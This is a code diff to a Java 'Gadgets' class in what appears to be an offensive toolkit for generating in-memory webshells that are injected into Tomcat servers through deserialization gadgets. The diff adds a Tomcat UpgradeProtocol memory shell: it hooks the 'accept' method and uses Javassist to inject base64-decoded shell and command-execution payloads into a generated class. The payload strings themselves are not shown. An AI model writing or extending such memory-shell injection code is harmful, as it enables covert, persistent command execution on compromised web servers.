@@ -117,6 +117,7 @@ public class Gadgets {
 					case "ts":
 					case "tw":
 					case "te":
+					case "tu":
 						packageName += "tomcat.";
 						break;
 					case "sp":
@@ -287,6 +288,15 @@ public class Gadgets {
 					}
 
 
+				} else if (className.contains("UGMS")) {
+					insertKeyMethod(ctClass, "upgrade");
+
+					if (IS_INHERIT_ABSTRACT_TRANSLET) {
+						bytes = ctClass.toBytecode();
+						cName = ctClass.getName();
+					}
+
+
 				} else if (className.contains("EXMS")) {
 					insertKeyMethod(ctClass, "execute");
 
@@ -407,6 +417,10 @@ public class Gadgets {
 				method = "onMessage";
 				isTomcat = false;
 				break;
+			} else if (iName.equals("org.apache.coyote.UpgradeProtocol")) {
+				method = "accept";
+				isTomcat = false;
+				break;
 			}
 		}
 
@@ -463,6 +477,11 @@ public class Gadgets {
 			case "ws":
 				insertCMD(ctClass);
 				insertMethod(ctClass, method, Utils.base64Decode(WS_SHELL));
+				break;
+			case "upgrade":
+				ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_FIELD_VALUE), ctClass));
+				insertCMD(ctClass);
+				insertMethod(ctClass, method, Utils.base64Decode(UPGRADE_SHELL));
 				break;
 			// 命令执行回显内存马
 			case "cmd":
